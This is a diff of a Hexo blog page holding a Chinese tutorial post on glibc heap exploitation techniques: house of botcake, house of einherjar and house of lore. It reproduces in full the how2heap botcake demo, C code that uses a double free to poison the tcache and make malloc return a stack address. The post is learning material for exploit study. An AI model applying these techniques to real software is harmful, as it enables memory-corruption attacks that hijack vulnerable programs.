@@ -1,160 +1,167 @@
 <!DOCTYPE html>
-<html>
-    <head>
-    <meta charset="utf-8">
-    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
-    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
-    <title>Loora1N&#39;s Blog | 鹭雨 | </title>
-    
-<link rel="stylesheet" href="/css/reset.css">
+<html lang="zh-CN">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
 
-    
-<link rel="stylesheet" href="/css/style.css">
+    <meta name="author" content="Loora1N">
 
-    
-<link rel="stylesheet" href="/css/markdown.css">
 
-    
-<link rel="stylesheet" href="/css/fonts.css">
 
-<meta name="generator" content="Hexo 6.2.0"></head>
-    <body>
-        <div class="paper">
-            <div class="paper-main">
-                
-                    <div class="post-header">
-    <a class="logo" href="/">Loora1N&#39;s Blog | 鹭雨</a>
-    <a class="go-home" href="/">
-        <svg width="8" height="14" viewBox="0 0 8 14">
-            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
-        </svg>
-    </a>
+    <meta name="description" content="Blog of Loora1N">
+
+
+
+
+
+<title>【how2heap】 botcake,einherjar,lore | Loora1N&#39;s Blog | 鹭雨</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/menu.js"></script>
+    
+    <script src="/js/highlight.min.js"></script>
+    
+    <script src="/js/highlightjs-line-numbers.js"></script>
+    
+    <script src="/js/format.js"></script>
+    
+    <script src="/js/search.js"></script>
+    
+
+
+
+
+
+
+
+
+
+
+  <meta name="generator" content="Hexo 6.2.0"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      <div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/">
+          
+            Loora1N&#39;s Blog | 鹭雨
+          
+        </a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/">首页</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/archives/">索引</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/about/">述己</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/links/">友链</a>
+              </li> 
+                   
+          
+          
+            <li class="menu-item search-btn">
+              <a href="#">Search</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </div>
 </div>
-                
-                <div class="post-main">
 
-    
-    
-        <div class="post-main-title">
-            【how2heap】 botcake,einherjar,lore
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    <div class="post-head">
+    <div class="post-info">
+        <div class="tag-list">
+            
         </div>
-        <div class="post-meta">
-            2022-10-20
+        <div class="post-title">
+            
+            
+                【how2heap】 botcake,einherjar,lore
+            
+            
         </div>
-        <div class="post-md">
-            <blockquote>
+        <span class="post-date">
+            10月 20, 2022
+        </span>
+    </div>
+    <div class="post-img">
+        
+            <div class="h-line-primary"></div>
+              
+    </div>
+</div>
+    <div class="post-content">
+    <blockquote>
 <p>本系列将针对glibc2.31及glibc2.35两个版本进行讨论，其他版本可以根据特性进行类推，建议先对各种堆块的基本特性和数据结构做已了解之后进行学习。</p>
 </blockquote>
 <h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h2><p>house_of_botcake利用的是块的分割，使得只存在uaf漏洞的前提下实现堆块的溢出,达到获取任意地址的目的，下面我们用how2heap中的例子进行理解。</p>
-<pre><code class="c">#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;stdint.h&gt;
-#include &lt;assert.h&gt;
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This attack only relies on double free.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The address we want malloc() to return, namely,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing heap layout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a chunk for later consolidation&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// simple tcache poisoning</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="type">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we can cash out the target chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The new chunk is at %p\n&quot;</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// note</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
-int main()
-&#123;
-    /*
-     * This attack should bypass the restriction introduced in
-     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d
-     * If the libc does not include the restriction, you can simply double free the victim and do a
-     * simple tcache poisoning
-     * And thanks to @anton00b and @subwire for the weird name of this technique */
-
-    // disable buffering so _IO_FILE does not interfere with our heap
-    setbuf(stdin, NULL);
-    setbuf(stdout, NULL);
-
-    // introduction
-    puts(&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;);
-    puts(&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;);
-    puts(&quot;This attack only relies on double free.\n&quot;);
-
-    // prepare the target
-    intptr_t stack_var[4];
-    puts(&quot;The address we want malloc() to return, namely,&quot;);
-    printf(&quot;the target address is %p.\n\n&quot;, stack_var);
-
-    // prepare heap layout
-    puts(&quot;Preparing heap layout&quot;);
-    puts(&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;);
-    intptr_t *x[7];
-    for(int i=0; i&lt;sizeof(x)/sizeof(intptr_t*); i++)&#123;
-        x[i] = malloc(0x100);
-    &#125;
-    puts(&quot;Allocating a chunk for later consolidation&quot;);
-    intptr_t *prev = malloc(0x100);
-    puts(&quot;Allocating the victim chunk.&quot;);
-    intptr_t *a = malloc(0x100);
-    printf(&quot;malloc(0x100): a=%p.\n&quot;, a); 
-    puts(&quot;Allocating a padding to prevent consolidation.\n&quot;);
-    malloc(0x10);
-    
-    // cause chunk overlapping
-    puts(&quot;Now we are able to cause chunk overlapping&quot;);
-    puts(&quot;Step 1: fill up tcache list&quot;);
-    for(int i=0; i&lt;7; i++)&#123;
-        free(x[i]);
-    &#125;
-    puts(&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;);
-    free(a);
-    
-    puts(&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;);
-    free(prev);
-    
-    puts(&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;);
-    malloc(0x100);
-    /*VULNERABILITY*/
-    free(a);// a is already freed
-    /*VULNERABILITY*/
-    
-    // simple tcache poisoning
-    puts(&quot;Launch tcache poisoning&quot;);
-    puts(&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;);
-    intptr_t *b = malloc(0x120);
-    puts(&quot;We simply overwrite victim&#39;s fwd pointer&quot;);
-    b[0x120/8-2] = (long)stack_var;
-    
-    // take target out
-    puts(&quot;Now we can cash out the target chunk.&quot;);
-    malloc(0x100);
-    intptr_t *c = malloc(0x100);
-    printf(&quot;The new chunk is at %p\n&quot;, c);
-    
-    // sanity check
-    assert(c==stack_var);
-    printf(&quot;Got control on target/stack!\n\n&quot;);
-    
-    // note
-    puts(&quot;Note:&quot;);
-    puts(&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;);
-    puts(&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;);
-
-    return 0;
-&#125;
-</code></pre>
 <p>首先我们用7个chunk填满tcache</p>
-<pre><code class="c">// cause chunk overlapping
-puts(&quot;Now we are able to cause chunk overlapping&quot;);
-puts(&quot;Step 1: fill up tcache list&quot;);
-for(int i=0; i&lt;7; i++)&#123;
-    free(x[i]);
-&#125;
-</code></pre>
-<p>之后free掉同样大小的prev chunk和a chunk，这时他们会在unsorted bin内合并为一个大chunk</p>
-<pre><code>puts(&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;);
-free(a);
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// cause chunk overlapping</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">    <span class="built_in">free</span>(x[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-puts(&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;);
-free(prev);
-</code></pre>
+<p>之后free掉同样大小的prev chunk和a chunk，这时他们会在unsorted bin内合并为一个大chunk</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">puts(&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;);</span><br><span class="line">free(prev);</span><br></pre></td></tr></table></figure>
+
 <p>先申请一个chunk，然后利用uaf，对 a chunk再次free，让其进入tcache。此时，a chunk同时在tcache和unsorted bin 中。</p>
-<pre><code>puts(&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;);
-malloc(0x100);
-/*VULNERABILITY*/
-free(a);// a is already freed
-/*VULNERABILITY*/
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">puts(&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;);</span><br><span class="line">malloc(0x100);</span><br><span class="line">/*VULNERABILITY*/</span><br><span class="line">free(a);// a is already freed</span><br><span class="line">/*VULNERABILITY*/</span><br></pre></td></tr></table></figure>
+
 <p>此时如果我们申请一个大一点的chunk，比如0x120，那么就会把prev的指针返回回来，并且可以对a chunk进行溢出，进而更改a chunk的fd，bk等等。</p>
 <h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h2><p>house of einherjar是一种特殊的堆利用手段，在存在堆溢出可以更改下一个chunk的PREV_INUSE位时，可以利用free的堆块合并，使用这种方式实现任意地址的控制。</p>
 <p><img src="/img/article/how2heap1/backward_consolidate-1666247169487-3.png" alt="示意图"></p>
@@ -169,34 +176,98 @@ free(a);// a is already freed
 <h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house_of_lore"></a>house_of_lore</h2><p>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。</p>
 <p>实际过程就是控制smallbin的最后一个chunk的bk指针，以及fakechunk的fd指针完成双链表的构建既可两次malloc控制任意地址</p>
 
-        </div>
+</div> 
 
+<script>
+    window.onload = detectors();
+</script>
+    <div class="post-footer">
+    <div class="h-line-primary"></div>
+    <nav class="post-nav">
+        <div class="prev-item">
+           
+                <div class="icon arrow-left"></div>
+                <div class="post-link">
+                    <a href="/2022/10/25/vscode%E4%BD%BF%E7%94%A8pwntools%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE%E5%87%BA%E9%94%99/">Prev</a>
+                </div>
+            
+        </div>
+        <div class="next-item">
+            
+                <div class="icon arrow-right"></div>
+                <div class="post-link">
+                  <a href="/2022/10/18/Kernel-pwnbase%E8%AF%A6%E8%A7%A3/">Next</a>  
+                </div>  
+            
+        </div>
+    </nav>
+</div>
+
+    
+      <div class="post-comment">
+
+     
+
+     
+    
     
 
 </div>
-                <div class="footer">
-    <span>Copyright © 2022 Loora1N&#39;s Blog | 鹭雨</span>
-    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
+     
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+            
+            
+                Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/zoeingwingkei/frame/">Frame</a>
+                
+        </div>
+    </div>
 </div>
 
+    </div>
 
-<link rel="stylesheet" href="/css/a11y-dark.min.css">
-
-
-<script src="/js/highlight.min.js"></script>
-
-
-<script src="/js/highlightjs-line-numbers.js"></script>
-
-
-<script>
-    hljs.initHighlightingOnLoad();
-    hljs.initLineNumbersOnLoad();
-</script>
-
+    
+      <div class="search-popup">
+    <div class="search-popup-overlay">  
+    </div>
+    <div class="search-popup-window" >
+        <div class="search-header">
+            <div class="search-input-container">
+              <input autocomplete="off" autocapitalize="off" maxlength="80"
+                     placeholder="Search Anything" spellcheck="false"
+                     type="search" class="search-input">
+            </div>
+            <div class="search-close-btn">
+                <div class="icon close-btn"></div>
             </div>
         </div>
-    <!-- hexo injector body_end start -->
+        <div class="search-result-container">
+        </div>
+    </div>
+</div>
+
+<script>
+    const searchConfig = {
+        path             : "/search.xml",
+        top_n_per_article: "1",
+        unescape         : "false",
+        trigger: "auto",
+        preload: "false"
+    }
+</script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script>
+<script src="/js/search.js"></script>
+    
+    
+
+  <!-- hexo injector body_end start -->
   <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
   <script data-pjax>
         function GithubCalendarConfig(){
